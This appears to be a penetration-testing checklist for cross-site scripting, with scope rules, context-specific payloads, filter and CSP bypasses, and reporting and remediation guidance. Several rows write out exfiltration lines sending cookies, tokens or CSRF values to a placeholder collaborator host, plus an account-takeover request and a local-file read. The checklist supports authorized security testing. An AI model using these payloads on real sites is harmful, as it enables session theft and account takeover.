# XSS — Checklist

Expert per-attack **test-case matrix** for XSS — in testing order, impact-first. All columns preserved (where to inject, steps, expected, payload, impact, severity, CVSS, tools, refs).

*26 test cases · spreadsheet grid — scroll sideways for all 12 columns.*

| Operation | Test Case Name | Test Category | Where to Test / Injection Point | Test Steps | Expected Result | Payload Example | Impact | Severity | CVSS | Tools | References |
|---|---|---|---|---|---|---|---|---|---|---|---|
| XSS-001 | Lab setup + OOB listener + two accounts | Recon &amp; Lab | Whole engagement, before testing | 1. Confirm XSS (active testing) is in scope and note PoC rules (allowed exfil, no real-user data, no mass-firing).<br>2. Proxy running; two browser profiles (victim + attacker); OOB listener live (Collaborator/interactsh/XSS-Hunter).<br>3. Create 2+ test accounts for cross-user / stored / ATO impact. | Scope confirmed, OOB listener live, two accounts ready. | <code>XSS-Hunter payload host = $COLLAB ; profiles: victim, attacker</code> | Blind/stored/ATO proof needs an OOB listener and two accounts up front. | Info | 0.0 (N/A) | Burp/Caido, XSS Hunter, interactsh | CWE-79; OWASP Testing Guide: Testing for XSS (WSTG-INPV-01/02) |
| XSS-002 | Map EVERY input source | Recon &amp; Surface Map | query/path/fragment, POST/JSON, headers, cookies, upload, WebSocket, postMessage, staff-rendered inputs | 1. Crawl (katana) + harvest historical params (gau/waybackurls); run Arjun/param-miner for HIDDEN params.<br>2. Enumerate every source: query, path, URL fragment (#, DOM source), POST/JSON keys, headers (Referer, UA, X-Forwarded-Host, Origin), cookies, file upload (filename+content), WebSocket frames, postMessage.<br>3. Flag inputs rendered to STAFF/ADMIN later (feedback/tickets/names) as blind candidates. Fingerprint framework/CSP/WAF/cookie flags. | A complete input inventory including hidden params and blind (staff-rendered) candidates. | <code>arjun -u $URL ; gau target ; headers: X-Forwarded-Host, Referer ; #fragment ; upload filename</code> | Most missed XSS is a missed input - coverage is the whole game here. | Info | 0.0 (N/A) | katana, gau, Arjun, param-miner | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-003 | Char-probe + name the context (decision flow) | Reflection &amp; Context | Each input source | 1. Inject a unique marker + the probe xss7f3a9'"&lt;&gt; into every input; find it in RAW HTML AND the live DOM.<br>2. Record which probe chars came back RAW vs encoded PER location - that names the context.<br>3. Run the decision flow: HTML body / attr-quoted / attr-unquoted / JS-in-attr / JS-string / URL / CSS / DOM-only. If all encoded -&gt; pivot (JS/URL/DOM/CSTI) rather than fighting HTML. | The exact injection context is named from which characters survived raw. | <code>probe xss7f3a9'"&lt;&gt; ; '&lt;' raw + '"' encoded -&gt; HTML body ; only in DOM -&gt; DOM-based</code> | Context selects the minimal working payload; guessing wastes the input. | Info | 0.0 (N/A) | Burp Repeater, browser DevTools | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-004 | Reflected XSS — HTML body context | Reflected — HTML Body | Input reflected between tags with &lt; &gt; raw | 1. Inject a tag/auto-event payload: &lt;svg onload=alert(document.domain)&gt; / &lt;img src=x onerror=alert(document.domain)&gt;.<br>2. Confirm execution with alert(document.domain) (not just injection).<br>3. Ensure cross-user DELIVERY via a crafted URL. | alert(document.domain) fires in the app origin from a crafted URL. | <code>"&gt;&lt;svg onload=alert(document.domain)&gt; ; &lt;img src=x onerror=alert(document.domain)&gt;</code> | Reflected XSS -&gt; session/account actions in the victim's browser. Medium (High if it reaches a session). | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Repeater | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-005 | Reflected XSS — attribute context (breakout / event) | Reflected — Attribute | Input reflected inside an HTML attribute | 1. Quoted, &gt; raw: "&gt;&lt;svg onload=alert(1)&gt;.<br>2. Quote survives, &gt; encoded: stay in tag - " autofocus onfocus=alert(1) x=".<br>3. Unquoted: x onmouseover=alert(1). Inside on&#42;="...": ');alert(1)// (entities decode). | The attribute is broken out of (or an event added) and script executes. | <code>" autofocus onfocus=alert(document.domain) x=" ; x onmouseover=alert(1) ; ');alert(1)//</code> | Reflected XSS via attribute injection. Medium/High. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Repeater | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-006 | Reflected XSS — JavaScript string / template | Reflected — JS Context | Input reflected inside a &lt;script&gt; string/template | 1. Double-quoted string: ";alert(document.domain)//.<br>2. Single: ';alert(document.domain)//. Template literal: ${alert(document.domain)}.<br>3. Break the whole element when &lt; &gt; survive: &lt;/script&gt;&lt;svg onload=alert(1)&gt;. Handle backslash-escaping: \";alert(1)//. | The JS string is broken out of and script executes. | <code>";alert(document.domain)// ; ${alert(document.domain)} ; &lt;/script&gt;&lt;svg onload=alert(1)&gt;</code> | Reflected XSS in a JS sink. Medium/High. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Repeater | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-007 | Reflected XSS — URL / javascript: / data: | Reflected — URL Context | Input reflected into href/src/action | 1. javascript:alert(document.domain) in href/src/formaction.<br>2. Obfuscate filters: JaVaScRiPt:, java%0ascript:, javascript:%61lert(1).<br>3. data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;. | Clicking/loading the URL executes script in the app origin. | <code>javascript:alert(document.domain) ; data:text/html,&lt;script&gt;alert(document.domain)&lt;/script&gt;</code> | Reflected/DOM XSS via URL sink. Medium/High. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp Repeater | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-008 | CSS context breakout + CSS exfiltration | Reflected — CSS | Input reflected inside a &lt;style&gt;/style context | 1. Break out: red"&gt;&lt;/style&gt;&lt;svg onload=alert(1)&gt;.<br>2. No-JS CSS exfil of a token char-by-char (escalate when CSP blocks JS): input[name=csrf][value^=a]{background:url(//$COLLAB/leak?c=a)}.<br>3. @import url(//$COLLAB/x.css) if it survives. | Style is broken out to script, or a token is exfiltrated via CSS selectors. | <code>red"&gt;&lt;/style&gt;&lt;svg onload=alert(1)&gt; ; input[name=csrf][value^=a]{background:url(//$COLLAB/leak?c=a)}</code> | XSS or CSRF-token/CSP-defeating data exfil via CSS. Medium/High. | Medium | 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N) | Burp Repeater | CWE-79; HackTricks: XSS |
| XSS-009 | DOM-based XSS (sink trace + #fragment) | DOM XSS | Client-side sinks: innerHTML/eval/document.write/location/setTimeout | 1. Trace source-&gt;sink with DOM Invader; fragment source never reaches the server (bypasses WAF): #&lt;img src=x onerror=alert(document.domain)&gt;.<br>2. ?returnUrl=javascript:alert(1) into a location sink.<br>3. Confirm in the live DOM. | A client-side sink executes attacker-controlled markup/JS. | <code>$URL#&lt;img src=x onerror=alert(document.domain)&gt; ; ?next=javascript:alert(1)</code> | DOM XSS - fully client-side, often CSP/WAF-evading. Medium/High. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | DOM Invader, browser DevTools | CWE-79; CWE-116; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-010 | postMessage / window.name DOM XSS | DOM XSS | message event listeners / window.name sinks | 1. From an attacker page, open()/frame the target and postMessage a payload; test a MISSING origin check: w.postMessage('&lt;img src=x onerror=alert(document.domain)&gt;','&#42;').<br>2. window.name source: window.name='&lt;img src=x onerror=alert(1)&gt;'; location='$URL/sink'.<br>3. Confirm the listener writes it to a sink. | The message/window.name handler writes attacker markup to a DOM sink. | <code>w.postMessage('&lt;img src=x onerror=alert(document.domain)&gt;','&#42;') ; window.name=payload</code> | Cross-origin-deliverable DOM XSS via unvalidated postMessage. High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | DOM Invader | CWE-79; CWE-346; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-011 | Stored XSS — every consumer (incl. admin/email/export) | Stored XSS | Profile/comment/name/ticket fields and all their render points | 1. Plant a payload in every field; check EVERY consumer: the app UI, admin panels, email templates, CSV/PDF exports, mobile.<br>2. Confirm execution where it renders raw.<br>3. Cross-user: fires in ANOTHER user's/admin's browser. | The stored value executes in another user's or admin's browser. | <code>display name = "&gt;&lt;svg onload=alert(document.domain)&gt; ; fires in admin ticket view</code> | Stored XSS -&gt; cross-user/admin compromise, no click needed. High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Repeater | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-012 | Second-order / blind XSS (staff-visible sinks) | Stored — Blind | Inputs rendered later to staff/admin (feedback, tickets, logs, user-agent) | 1. Plant an XSS-Hunter beacon in staff-visible inputs/headers (User-Agent, contact form, order notes).<br>2. Trace a stored value to a place it renders RAW (second-order).<br>3. Wait for the callback proving WHERE it fired (admin origin). | A beacon fires from an internal/admin page, proving blind XSS. | <code>User-Agent: "&gt;&lt;script src=//$COLLAB/h.js&gt;&lt;/script&gt; ; XSS-Hunter callback from /admin</code> | Blind XSS in admin context -&gt; admin action / data read / priv-esc. High/Critical. | High | 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) | XSS Hunter, interactsh | CWE-79; HackTricks: XSS |
| XSS-013 | mXSS / sanitizer (DOMPurify) bypass | Sanitizer Bypass | Output passed through DOMPurify/sanitize-html/Bleach/Loofah | 1. Match the library+version (bundle/headers).<br>2. Feed mutation classes and view the POST-sanitization DOM: namespace confusion (foreignObject/mglyph/annotation-xml), noscript/CDATA re-parse, template/xmp survival.<br>3. Probe config gaps: loose ALLOWED_URI_REGEXP, USE_PROFILES svg/mathML, forgotten ADD_ATTR handler. | Markup mutates back into script after sanitization (parser-roundtrip mismatch). | <code>&lt;svg&gt;&lt;/p&gt;&lt;style&gt;&lt;a id="&lt;/style&gt;&lt;img src=1 onerror=alert(document.domain)&gt;"&gt; ; &lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;...</code> | mXSS surviving DOMPurify on a major app is a clean High -&gt; ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | browser DevTools, cure53 advisories | CWE-79; CWE-80; HackTricks: XSS |
| XSS-014 | DOM Clobbering | DOM XSS | Sanitizer allows id/name; JS reads a global/config from the DOM | 1. HTML-only injection (no script): clobber a global the JS trusts - &lt;a id=x&gt;&lt;form&gt;, &lt;img name=config&gt;.<br>2. Steer a src/href/innerHTML sink the JS builds from the clobbered value.<br>3. Confirm the sink executes. | A clobbered DOM property redirects a JS sink to attacker content. | <code>&lt;a id=defaultAvatar href=cid:x&gt;&lt;form id=config&gt;&lt;input name=src value=...&gt;</code> | DOM XSS via clobbering where scripts are blocked - Medium/High. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | DOM Invader | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-015 | Framework-specific (React / Vue / AngularJS CSTI) | Framework | React dangerouslySetInnerHTML, Vue v-html, AngularJS {{}}, Handlebars triple-stache | 1. AngularJS CSTI (works even when &lt; &gt; are encoded): {{constructor.constructor('alert(document.domain)')()}}.<br>2. React dangerouslySetInnerHTML / href={&#96;javascript:...&#96;}; Vue v-html sink.<br>3. Handlebars/Mustache {{{ userInput }}} renders raw HTML. | The framework sink/expression evaluates attacker input to script. | <code>{{constructor.constructor('alert(document.domain)')()}} ; dangerouslySetInnerHTML={{__html:input}}</code> | XSS via framework template/sink - Medium/High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | browser DevTools | CWE-79; CWE-1336; HackTricks: XSS |
| XSS-016 | File-based XSS (SVG / filename / markdown / PDF) | File-based | SVG/HTML upload served inline, filename, markdown, HTML-&gt;PDF generators | 1. SVG served inline from app origin: &lt;svg onload=alert(document.domain)&gt; -&gt; stored XSS.<br>2. Filename XSS: "&gt;&lt;img src=x onerror=alert(document.domain)&gt;.png. Markdown: [x](javascript:alert(1)).<br>3. HTML-&gt;PDF LFI/SSRF: &lt;iframe src=file:///etc/passwd&gt;. | An uploaded/rendered file executes script in the app origin. | <code>xss.svg (onload=alert(document.domain)) ; [x](javascript:alert(1)) ; filename XSS</code> | Stored XSS via file/markdown; PDF-gen LFI/SSRF - High. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp, FileUpload kit | CWE-79; HackTricks: XSS |
| XSS-017 | WAF / filter bypass | Evade — WAF/Filter | Inputs behind a signature WAF | 1. Case/structure: &lt;sCrIpT&gt;, &lt;svg/onload=..&gt;, literal tab/newline between attrs.<br>2. Encodings &amp; entity decode: &lt;svg onload=&amp;#97;lert(1)&gt;. Defeat 'alert' signature: top['ale'+'rt'](1), eval(atob('...')).<br>3. No parens: alert&#96;1&#96;. No spaces: &lt;svg/onload=..&gt;. Move to a different injection point / DOM #fragment (never sent to server). | The payload bypasses the WAF and executes. | <code>&lt;sVg/oNloAd=top['ale'+'rt'](1)&gt; ; alert&#96;document.domain&#96; ; DOM #fragment (WAF-free)</code> | Restores XSS against WAFs - proves the filter is not a fix. | Medium | 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) | Burp, DOM Invader | CWE-79; PayloadsAllTheThings/XSS Injection |
| XSS-018 | CSP bypass | Evade — CSP | Pages with a Content-Security-Policy | 1. Score the CSP (csp-evaluator): unsafe-inline/unsafe-eval, script-src &#42; / https: / data:, reused/reflected nonce, missing base-uri/object-src.<br>2. JSONP on an allow-listed origin; AngularJS/library script-gadget; &lt;base&gt; hijack; Report-Only (does NOT block).<br>3. No-JS dangling-markup exfil when scripts truly blocked. | Script executes (or a token is exfiltrated) despite the CSP. | <code>allow-listed JSONP: &lt;script src=//allowed/api/jsonp?callback=alert&gt; ; &lt;base href=//$ATTACKER/&gt; ; Report-Only = full XSS</code> | Defeats CSP -&gt; full XSS/exfil - proves the CSP inadequate. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | csp-evaluator, Burp | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-019 | Trusted Types bypass | Evade — Trusted Types | Pages with require-trusted-types-for 'script' | 1. Look for a pass-through default policy / a reusable named policy.<br>2. Report-only-or-missing-on-API gap; a non-TT sink like location=javascript:.<br>3. Confirm execution despite TT enforcement. | Script executes via a TT policy gap or a non-TT sink. | <code>trustedTypes.defaultPolicy pass-through ; location='javascript:alert(1)' (non-TT sink)</code> | Defeats Trusted Types - the last DOM-XSS mitigation. High. | High | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) | DOM Invader | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-020 | Cookie theft (non-HttpOnly) -&gt; session hijack | Impact — Session Theft | Confirmed XSS + a non-HttpOnly session cookie | 1. Exfil the cookie: new Image().src='//$COLLAB/c?'+encodeURIComponent(document.cookie).<br>2. Replay it to access the victim's session; screenshot the victim account.<br>3. Own two accounts; own data only. | The victim's session cookie is exfiltrated and replays into their account. | <code>new Image().src='//$COLLAB/c?'+encodeURIComponent(document.cookie)</code> | Session hijack / account access via cookie theft - High. | High | 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) | XSS Hunter, Burp | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-021 | Token / localStorage theft -&gt; authenticated API calls | Impact — Token Theft | Confirmed XSS + token-in-localStorage auth | 1. Exfil storage: fetch('//$COLLAB/t',{method:'POST',mode:'no-cors',body:JSON.stringify({ls:{...localStorage}})}).<br>2. Use the token to call the API as the victim.<br>3. Own data only. | The victim's token is exfiltrated and makes authenticated API calls. | <code>fetch('//$COLLAB/t',{method:'POST',mode:'no-cors',body:JSON.stringify({ls:{...localStorage}})})</code> | Full API access as the victim via token theft - High. | High | 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N) | XSS Hunter | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-022 | HttpOnly-proof ATO — steal CSRF token -&gt; force email/password change | Impact — ATO | Confirmed XSS where the session cookie IS HttpOnly | 1. XSS can't read an HttpOnly cookie - instead read the in-page CSRF token and drive an authenticated action.<br>2. fetch('/account/email',{method:'POST',credentials:'include',body:'csrf_token='+document.querySelector('[name=csrf_token]').value+'&amp;email=attacker@evil.tld'}) -&gt; then reset.<br>3. Demonstrate end-to-end ATO on your own two accounts. | The XSS forces an account-changing action, resulting in takeover. | <code>read csrf_token from DOM -&gt; POST /account/email with credentials:include -&gt; reset -&gt; ATO</code> | Full account takeover from XSS even with HttpOnly cookies - Critical. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | Burp, XSS Hunter | CWE-79; CWE-352; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-023 | Admin-context escalation + wormability | Impact — Escalation | Blind/stored XSS reaching admin/staff; multi-user stored content | 1. In admin/staff context: perform an admin action / read sensitive data / self-promote.<br>2. Assess (and DESCRIBE, do not release) wormability for stored multi-user content.<br>3. State impact: 'An attacker can make &lt;victim&gt; suffer &lt;harm&gt; with &lt;N&gt; clicks.' | The XSS performs a privileged admin action or is shown to be wormable. | <code>blind XSS in admin -&gt; create-admin API call ; stored payload self-propagates (described only)</code> | Admin compromise / self-propagating worm from stored XSS - Critical. | Critical | 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N) | XSS Hunter | CWE-79; HackTricks: XSS |
| XSS-024 | False-positive filter / auto-reject | Validation &amp; Reporting | Before reporting any candidate | 1. REJECT: self-XSS (no cross-user delivery); encoded-only reflection (never executed); CSP-blocked on production; out-of-context injection that doesn't run.<br>2. REQUIRE: script EXECUTED in the app origin (alert(document.domain) / collaborator hit), cross-user delivery, and (for a strong report) escalation past alert().<br>3. Confirm it survives the PRODUCTION CSP/WAF. | Only executing, cross-user-deliverable XSS survives. | <code>self-XSS = invalid ; encoded-only = not XSS ; CSP-blocked on prod = not exploitable</code> | Protects credibility; XSS is dense with self-XSS / encoded-only false positives. | Info | 0.0 (N/A) | manual | CWE-79; PortSwigger Web Security Academy: Cross-site scripting |
| XSS-025 | Client-facing impact &amp; SAFE PoC package | Validation &amp; Reporting | Confirmed finding, pre-submission | 1. Title names the IMPACT ('Account takeover via stored XSS in display name'), not 'XSS in X'.<br>2. Provide the trigger URL/request, a screenshot/video of execution, and the collaborator/XSS-Hunter log; state the attacker-impact sentence.<br>3. Set a defensible CVSS 3.1 vector + CWE-79 (+80/116). Remediation: context-aware output encoding, framework auto-escaping, a strong CSP (nonce + Trusted Types), HttpOnly+Secure+SameSite cookies, sanitize with a maintained library.<br>4. Own data only, own two accounts, no mass-firing, clean up planted payloads/keys/service workers; de-dupe to one root cause. | A reproducible, correctly-rated, safe PoC with clear remediation. | <code>PoC: trigger + execution screenshot + collaborator log + impact sentence + CVSS + CWE-79 + remediation.</code> | Converts execution into a defensible Medium-to-Critical report at the escalated severity. | Info | 0.0 (N/A) | CVSS calculator, XSS_REPORT_TEMPLATE.md | CWE-79; CWE-80; CWE-116; FIRST CVSS v3.1; OWASP Testing Guide: Testing for XSS (WSTG-INPV-01/02)  &#124;  TOP REFERENCES: Gareth Heyes / PortSwigger Research XSS; Cure53 DOMPurify advisories; SonarSource mXSS research; PayloadsAllTheThings; HackTricks; XS-Leaks wiki |
| XSS-026 | Client-Side Path Traversal (CSPT) -&gt; CSRF/IDOR | DOM-Based / Client-Side | Front-end JS building an API path/URL from user input (fetch/axios/router) | 1. Find front-end code that concatenates user input into a request path/URL<br>2. Inject ../ (encoded) to redirect the client-issued request to another endpoint<br>3. Chain to CSRF/IDOR: make the victim's browser call a sensitive endpoint with their creds<br>4. Confirm the traversed request executes | Client encodes/validates path segments; user input never composes request paths | <code>/#/profile/..%2f..%2fadmin%2fdeleteUser?id=1   (front-end does fetch('/api/'+input))</code> | Client-side path traversal -&gt; redirect victim's authenticated fetch -&gt; CSRF/IDOR/data leak | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp, browser DevTools | CWE-22; CWE-79; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); Doyensec CSPT2CSRF research; PortSwigger |
